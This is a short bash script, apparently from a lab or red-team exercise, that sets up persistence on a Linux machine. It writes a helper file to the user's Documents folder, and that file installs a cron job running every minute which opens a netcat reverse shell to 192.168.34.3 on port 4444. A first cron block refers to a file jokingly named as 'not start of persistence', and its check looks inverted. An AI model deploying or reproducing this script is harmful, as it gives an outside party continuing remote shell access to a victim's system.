#!/bin/bash

CRON_JOB="* * * * * /tmp/totally-innocent/totally-innocent-not-start-of-persistence.sh"

# Check if the cron job already exists
if crontab -l 2>/dev/null | grep -qF "$CRON_JOB"; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
else
    :
fi


#Cron Job Reverse Shell
KEEP_ME_SCRIPT="$HOME/Documents/keep-me.sh"

if [ -f "$KEEP_ME_SCRIPT" ]; then
    bash "$KEEP_ME_SCRIPT"
else

echo '#!/bin/bash
CRON_JOB="* * * * * mkfifo /tmp/p; nc 192.168.34.3 4444 0</tmp/p | /bin/bash > /tmp/p 2>&1; rm /tmp/p"
(crontab -l 2>/dev/null | grep -q "$CRON_JOB") || {
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
}' > "$KEEP_ME_SCRIPT"

chmod +x "$KEEP_ME_SCRIPT"

fi
